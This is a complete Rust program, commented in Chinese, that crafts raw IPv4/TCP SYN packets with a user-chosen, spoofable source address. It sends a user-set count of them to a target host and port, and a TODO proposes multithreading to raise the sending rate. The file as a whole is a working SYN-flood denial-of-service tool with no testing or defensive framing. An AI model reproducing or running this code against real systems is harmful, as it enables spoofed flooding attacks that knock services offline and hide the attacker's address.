use std::net::Ipv4Addr;

use clap::Parser;
use pnet::{packet::{tcp::{TcpPacket, MutableTcpPacket, TcpFlags, ipv4_checksum, TcpOption}, ipv4::{MutableIpv4Packet, checksum, Ipv4Flags}, ip::IpNextHeaderProtocols}, };
use pnet_transport::transport_channel;
use pnet_transport::TransportChannelType::Layer3;
use rand::{random, thread_rng, Rng};

#[derive(Parser, Debug)]
#[clap(author, version, about, long_about = None)]
struct Args {
    #[clap(short, long)]
    target:String,
    #[clap(short, long)]
    source:String,
    #[clap(short, long)]
    port:u32,
    #[clap(short, long)]
    count:u32
}
const IPV4_HEADER_LEN: usize = 20;
const TCP_HEADER_LEN: usize = 32;
const TEST_DATA_LEN: usize = 1024;
fn main() {
    let args = Args::parse();
    println!("args:{:?}",args);

    // 选择 3 层 IPv4 协议, 构建发送器
    let protocol = Layer3(IpNextHeaderProtocols::Ipv4);
    let(mut tx, _) = match  transport_channel(64,protocol) {
        Ok(( tx, rx)) => (tx,rx),
        Err(e) => panic!("Error happened {}", e),
    };

    let target: Ipv4Addr = args.target.clone().parse().unwrap();
    // 根据 --count -c 这个参数设置发送的数据包数量
    // TODO 可以改成多线程发送,性能能再提高
    for _ in 0..args.count {
        // 构建数据包
        let mut packet = [0u8; IPV4_HEADER_LEN + TCP_HEADER_LEN + TEST_DATA_LEN];
        let packet = build_packet(args.source.clone(), args.target.clone(), args.port, &mut packet[..]);
    
        //println!("packet:{:#?}",packet);
        // 发送数据包到目标地址
        tx.send_to(packet,std::net::IpAddr::V4(target));
    }
    
    
}

fn build_packet(source:String,target:String,port:u32,packet: &mut [u8]) -> TcpPacket{
// Set data
    packet[IPV4_HEADER_LEN + TCP_HEADER_LEN] = 't' as u8;
    packet[IPV4_HEADER_LEN + TCP_HEADER_LEN + 1] = 'e' as u8;
    packet[IPV4_HEADER_LEN + TCP_HEADER_LEN + 2] = 's' as u8;
    packet[IPV4_HEADER_LEN + TCP_HEADER_LEN + 3] = 't' as u8;

    let ipv4_source: Ipv4Addr = source.parse().unwrap();
    let ipv4_destination:Ipv4Addr = target.parse().unwrap();
    {
        let len = packet.len();
        let mut ip_header = MutableIpv4Packet::new(&mut packet[..]).unwrap();
        ip_header.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
        ip_header.set_source(ipv4_source);
        ip_header.set_flags(Ipv4Flags::DontFragment);
        ip_header.set_destination(ipv4_destination);
        ip_header.set_ttl(128);
        ip_header.set_version(4);
        ip_header.set_header_length(5);
        let checksum = checksum(&ip_header.to_immutable());
        ip_header.set_checksum(checksum);
    }
    let mut rng = thread_rng();
    let mut tcp_header = MutableTcpPacket::new(&mut packet[IPV4_HEADER_LEN..]).unwrap();
    tcp_header.set_source(rng.gen_range(1000..5000));
    tcp_header.set_destination(port as u16);
    tcp_header.set_sequence(random::<u32>());
    tcp_header.set_flags(TcpFlags::SYN);
    tcp_header.set_window(rng.gen_range(1000..5000));
    tcp_header.set_data_offset(8);
    tcp_header.set_urgent_ptr(0);
    tcp_header.set_options(&[TcpOption::mss(1460), TcpOption::sack_perm(),  TcpOption::nop(), TcpOption::nop(), TcpOption::wscale(7)]);
    let checksum = ipv4_checksum(&tcp_header.to_immutable(), &ipv4_source, &ipv4_destination);

    tcp_header.set_checksum(checksum);



    TcpPacket::new(&mut packet[..]).unwrap()
}